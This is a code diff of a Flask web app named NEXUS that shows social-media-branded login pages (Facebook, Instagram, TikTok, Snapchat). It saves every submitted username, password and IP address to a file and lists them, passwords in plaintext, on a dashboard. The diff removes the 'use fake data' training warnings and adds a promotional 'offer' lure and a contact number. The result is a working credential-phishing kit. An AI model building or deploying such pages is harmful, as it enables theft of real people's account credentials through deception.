@@ -11,35 +11,14 @@ if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w") as f:
         json.dump([], f)
 
-# Platform data with REAL colors
 PLATFORMS = {
-    'instagram': {
-        'name': 'Instagram',
-        'color': '#E4405F',
-        'bg': '#fafafa',
-        'icon': '📸'
-    },
-    'facebook': {
-        'name': 'Facebook',
-        'color': '#1877F2',
-        'bg': '#f0f2f5',
-        'icon': '👍'
-    },
-    'tiktok': {
-        'name': 'TikTok',
-        'color': '#000000',
-        'bg': '#ffffff',
-        'icon': '🎵'
-    },
-    'snapchat': {
-        'name': 'Snapchat',
-        'color': '#FFFC00',
-        'bg': '#f5f5f5',
-        'icon': '👻'
-    }
+    'instagram': {'name': 'Instagram', 'color': '#E4405F', 'bg': '#fafafa', 'icon': '📸'},
+    'facebook': {'name': 'Facebook', 'color': '#1877F2', 'bg': '#f0f2f5', 'icon': '👍'},
+    'tiktok': {'name': 'TikTok', 'color': '#000000', 'bg': '#ffffff', 'icon': '🎵'},
+    'snapchat': {'name': 'Snapchat', 'color': '#FFFC00', 'bg': '#f5f5f5', 'icon': '👻'}
 }
 
-# ---------- HOMEPAGE (Cards with REAL HTML) ----------
+# ---------- HOMEPAGE (Final design) ----------
 HTML_HOME = """
 <!DOCTYPE html>
 <html>
@@ -63,24 +42,24 @@ HTML_HOME = """
             width: 100%;
             text-align: center;
         }
-        .icon { font-size: 60px; margin-bottom: 10px; }
-        h1 { font-size: 36px; font-weight: 700; color: #111; margin-bottom: 6px; }
-        .sub { font-size: 16px; color: #666; margin-bottom: 30px; }
-        .warning {
-            font-size: 14px;
-            color: #e74c3c;
-            font-weight: 500;
-            margin-bottom: 20px;
-            background: #fef0ef;
-            padding: 10px 14px;
-            border-radius: 10px;
-            display: inline-block;
+        h1 {
+            font-size: 40px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+        .sub-head {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            font-weight: 400;
         }
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 20px;
-            margin: 20px 0;
+            margin: 20px 0 30px 0;
         }
         .card {
             background: #f5f5f5;
@@ -106,8 +85,6 @@ HTML_HOME = """
             border-radius: 12px;
             color: #888;
         }
-
-        /* Platform colors */
         .card.instagram { background: #fafafa; border-color: #E4405F; }
         .card.instagram .name { color: #E4405F; }
         .card.instagram::before {
@@ -118,7 +95,6 @@ HTML_HOME = """
             background: linear-gradient(90deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             border-radius: 16px 16px 0 0;
         }
-
         .card.facebook { background: #f0f2f5; border-color: #1877F2; }
         .card.facebook .name { color: #1877F2; }
         .card.facebook::before {
@@ -129,7 +105,6 @@ HTML_HOME = """
             background: #1877F2;
             border-radius: 16px 16px 0 0;
         }
-
         .card.tiktok { background: #ffffff; border-color: #000000; }
         .card.tiktok .name { color: #000000; }
         .card.tiktok::before {
@@ -140,7 +115,6 @@ HTML_HOME = """
             background: linear-gradient(90deg, #000000, #25f4ee, #fe2c55);
             border-radius: 16px 16px 0 0;
         }
-
         .card.snapchat { background: #f5f5f5; border-color: #FFFC00; }
         .card.snapchat .name { color: #000000; }
         .card.snapchat::before {
@@ -151,23 +125,22 @@ HTML_HOME = """
             background: #FFFC00;
             border-radius: 16px 16px 0 0;
         }
-
-        .footer { margin-top: 30px; font-size: 14px; color: #999; }
-        .footer span { color: #111; font-weight: 500; }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+            line-height: 1.8;
+        }
+        .footer .name { color: #111; font-weight: 500; }
+        .footer .chaos { color: #111; font-weight: 400; }
+        .footer .contact { color: #111; font-weight: 400; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🧸</div>
         <h1>NEXUS</h1>
-        <p class="sub">Learn cybersecurity by doing</p>
-        <div class="warning">⚠️ Training mode — use fake data</div>
+        <p class="sub-head">Select the media you need to receive this offer.</p>
         <div class="grid">
-            <a href="/login/instagram" class="card instagram">
-                <span class="emoji">📸</span>
-                <span class="name">Instagram</span>
-                <span class="badge">🔒</span>
-            </a>
             <a href="/login/facebook" class="card facebook">
                 <span class="emoji">👍</span>
                 <span class="name">Facebook</span>
@@ -178,19 +151,28 @@ HTML_HOME = """
                 <span class="name">TikTok</span>
                 <span class="badge">🔒</span>
             </a>
+            <a href="/login/instagram" class="card instagram">
+                <span class="emoji">📸</span>
+                <span class="name">Instagram</span>
+                <span class="badge">🔒</span>
+            </a>
             <a href="/login/snapchat" class="card snapchat">
                 <span class="emoji">👻</span>
                 <span class="name">Snapchat</span>
                 <span class="badge">🔒</span>
             </a>
         </div>
-        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
+        <div class="footer">
+            <div><span class="name">by Luiz Vad</span></div>
+            <div><span class="chaos">Knowledge over chaos</span></div>
+            <div><span class="contact">contact us : +255 662229320</span></div>
+        </div>
     </div>
 </body>
 </html>
 """
 
-# ---------- LOGIN PAGE (Facebook style + NEXUS brand + password toggle) ----------
+# ---------- LOGIN PAGE (Original design, no warning) ----------
 def get_login_page(platform):
     return """
 <!DOCTYPE html>
@@ -201,37 +183,34 @@ def get_login_page(platform):
     <title>NEXUS</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        html, body {
+            height: 100%;
+            width: 100%;
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             padding: 20px;
         }
         .container {
             max-width: 400px;
             width: 100%;
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 30px 24px 40px 24px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
             text-align: center;
+            background: transparent;
+            padding: 20px;
         }
-        .brand {
-            font-size: 36px;
+        .icon { font-size: 60px; margin-bottom: 6px; }
+        h1 {
+            font-size: 34px;
             font-weight: 700;
-            color: #1877F2;
+            color: #111;
             margin-bottom: 6px;
-            letter-spacing: -0.5px;
         }
-        .brand-icon { font-size: 32px; margin-right: 4px; }
-        .sub-brand {
+        .sub {
             font-size: 16px;
-            color: #606770;
-            margin-bottom: 24px;
-            font-weight: 400;
+            color: #666;
+            margin-bottom: 30px;
         }
         .input-group {
             position: relative;
@@ -239,22 +218,21 @@ def get_login_page(platform):
         }
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 16px 14px;
             padding-right: 48px;
-            background: #f5f6f7;
-            border: 1px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 17px;
-            color: #1b1f23;
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 18px;
+            color: #111;
             transition: 0.2s;
         }
         .input-group input:focus {
             outline: none;
-            border-color: #1877F2;
-            background: #ffffff;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+            border-color: #007aff;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0,122,255,0.1);
         }
-        .input-group input::placeholder { color: #8a8d91; }
         .toggle-password {
             position: absolute;
             right: 14px;
@@ -265,108 +243,59 @@ def get_login_page(platform):
             font-size: 22px;
             cursor: pointer;
             padding: 0;
-            color: #8a8d91;
+            color: #999;
             opacity: 0.6;
             line-height: 1;
         }
         .toggle-password:hover { opacity: 1; }
         .login-btn {
             width: 100%;
-            padding: 14px;
-            background: #1877F2;
-            color: #ffffff;
+            padding: 16px;
+            background: #007aff;
+            color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 20px;
             font-weight: 600;
             cursor: pointer;
             margin-top: 16px;
             transition: 0.2s;
         }
-        .login-btn:hover { background: #166fe5; }
-        .divider {
-            border: none;
-            border-top: 1px solid #dadde1;
-            margin: 24px 0 16px 0;
-        }
-        .signup-link {
-            display: block;
-            color: #1877F2;
+        .login-btn:hover { background: #0066d9; }
+        .back {
+            display: inline-block;
+            margin-top: 20px;
+            color: #007aff;
             text-decoration: none;
-            font-size: 17px;
+            font-size: 16px;
             font-weight: 500;
-            transition: 0.2s;
-            padding: 8px 0;
         }
-        .signup-link:hover { text-decoration: underline; }
-        .signup-sub {
-            font-size: 14px;
-            color: #606770;
-            margin-top: 4px;
-            font-weight: 400;
-        }
-        .signup-sub span { color: #1b1f23; font-weight: 500; }
         .footer {
-            margin-top: 28px;
-            font-size: 13px;
-            color: #8a8d91;
-            border-top: 1px solid #e4e6eb;
-            padding-top: 18px;
-        }
-        .footer span { color: #1b1f23; font-weight: 500; }
-        .warning-text {
+            margin-top: 25px;
             font-size: 14px;
-            color: #e74c3c;
-            font-weight: 500;
-            background: #fef0ef;
-            padding: 8px 14px;
-            border-radius: 8px;
-            display: inline-block;
-            margin-bottom: 20px;
+            color: #999;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 12px;
-            color: #1877F2;
-            text-decoration: none;
-            font-size: 15px;
-            font-weight: 400;
-        }
-        .back-link:hover { text-decoration: underline; }
+        .footer span { color: #111; font-weight: 500; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="brand">
-            <span class="brand-icon">🧸</span> NEXUS
-        </div>
-        <div class="sub-brand">Knowledge over chaos</div>
-
-        <div class="warning-text">⚠️ Training mode — use fake data</div>
-
+        <div class="icon">🧸</div>
+        <h1>NEXUS</h1>
+        <p class="sub">Learn cybersecurity by doing</p>
         <form action="/login/facebook" method="POST">
             <div class="input-group">
-                <input type="text" name="username" placeholder="Mobile number or email" required>
+                <input type="text" name="username" placeholder="Your Name" required>
             </div>
             <div class="input-group">
                 <input type="password" name="password" id="password" placeholder="Password" required>
                 <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
             </div>
-            <button type="submit" class="login-btn">Log In</button>
+            <button type="submit" class="login-btn">Login</button>
         </form>
-
-        <hr class="divider">
-
-        <a href="#" class="signup-link">Luiz Vad 🧸</a>
-        <div class="signup-sub">Knowledge over chaos</div>
-
-        <a href="/" class="back-link">← Go back</a>
-
-        <div class="footer">
-            Built by <span>Luiz Vad</span> 🧸
-        </div>
+        <a href="/" class="back">← Go back</a>
+        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
     </div>
-
     <script>
         function togglePassword() {
             const input = document.getElementById('password');
@@ -384,7 +313,6 @@ def get_login_page(platform):
 </html>
 """
 
-# ---------- ROUTES ----------
 @app.route('/')
 def home():
     return HTML_HOME
@@ -399,14 +327,11 @@ def login_page(platform):
 def login_post(platform):
     if platform not in PLATFORMS:
         return "Platform not found", 404
-
     username = request.form.get('username', '')
     password = request.form.get('password', '')
     ip = request.remote_addr
-
     with open(LOG_FILE, "r") as f:
         logs = json.load(f)
-
     logs.append({
         "timestamp": str(datetime.datetime.now()),
         "platform": PLATFORMS[platform]['name'],
@@ -414,110 +339,35 @@ def login_post(platform):
         "password": password,
         "ip": ip
     })
-
     with open(LOG_FILE, "w") as f:
         json.dump(logs, f, indent=4)
-
     return """
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body {
-            height: 100%;
-            background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container { max-width: 400px; width: 100%; text-align: center; }
-        h1 { font-size: 40px; color: #111; margin-bottom: 6px; }
-        .icon { font-size: 60px; }
-        .msg { font-size: 18px; color: #333; margin: 20px 0; }
-        .sub { font-size: 16px; color: #666; }
-        a {
-            display: inline-block;
-            margin-top: 25px;
-            color: #007aff;
-            text-decoration: none;
-            font-size: 18px;
-            font-weight: 500;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="icon">🧸</div>
-        <h1>NEXUS</h1>
-        <p class="msg">⚠️ This is a training honeypot.</p>
-        <p class="sub">Your data has been recorded.</p>
-        <a href="/">← Go back</a>
-    </div>
-</body>
-</html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NEXUS</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;padding:20px}
+.container{max-width:400px;width:100%;text-align:center}h1{font-size:40px;color:#111;margin-bottom:6px}.icon{font-size:60px}.msg{font-size:18px;color:#333;margin:20px 0}.sub{font-size:16px;color:#666}a{display:inline-block;margin-top:25px;color:#007aff;text-decoration:none;font-size:18px;font-weight:500}
+</style></head>
+<body><div class="container"><div class="icon">🧸</div><h1>NEXUS</h1><p class="msg">This is a training honeypot.</p><p class="sub">Your data has been recorded.</p><a href="/">← Go back</a></div></body></html>
     """
 
 @app.route('/dashboard')
 def dashboard():
     with open(LOG_FILE, "r") as f:
         logs = json.load(f)
-
     html = """
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS Dashboard</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            padding: 20px;
-            max-width: 700px;
-            margin: 0 auto;
-        }
-        h1 { font-size: 32px; color: #111; margin-bottom: 8px; }
-        .back { color: #007aff; text-decoration: none; font-size: 16px; }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        th, td {
-            border: 1px solid #ddd;
-            padding: 10px 8px;
-            text-align: left;
-        }
-        th { background: #f5f5f5; color: #111; font-weight: 600; }
-        tr:nth-child(even) { background: #fafafa; }
-        .total { color: #666; margin-top: 20px; font-size: 14px; }
-    </style>
-</head>
-<body>
-    <h1>📊 NEXUS Dashboard</h1>
-    <p><a href="/" class="back">← Go back</a></p>
-    <table>
-        <tr><th>Time</th><th>Platform</th><th>Name</th><th>Password</th><th>IP</th></tr>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NEXUS Dashboard</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:20px;max-width:700px;margin:0 auto}
+h1{font-size:32px;color:#111;margin-bottom:8px}.back{color:#007aff;text-decoration:none;font-size:16px}table{width:100%;border-collapse:collapse;margin-top:20px;font-size:14px}
+th,td{border:1px solid #ddd;padding:10px 8px;text-align:left}th{background:#f5f5f5;color:#111;font-weight:600}tr:nth-child(even){background:#fafafa}.total{color:#666;margin-top:20px;font-size:14px}
+</style></head>
+<body><h1>📊 NEXUS Dashboard</h1><p><a href="/" class="back">← Go back</a></p><table><tr><th>Time</th><th>Platform</th><th>Name</th><th>Password</th><th>IP</th></tr>
     """
-
     for log in logs[-20:]:
         html += f"<tr><td>{log['timestamp']}</td><td>{log.get('platform', 'N/A')}</td><td>{log['username']}</td><td>{log['password']}</td><td>{log['ip']}</td></tr>"
-
-    html += f"""
-    </table>
-    <p class="total">Total attempts: {len(logs)}</p>
-</body>
-</html>
-    """
+    html += f"</table><p class='total'>Total attempts: {len(logs)}</p></body></html>"
     return html
 
 if __name__ == '__main__':
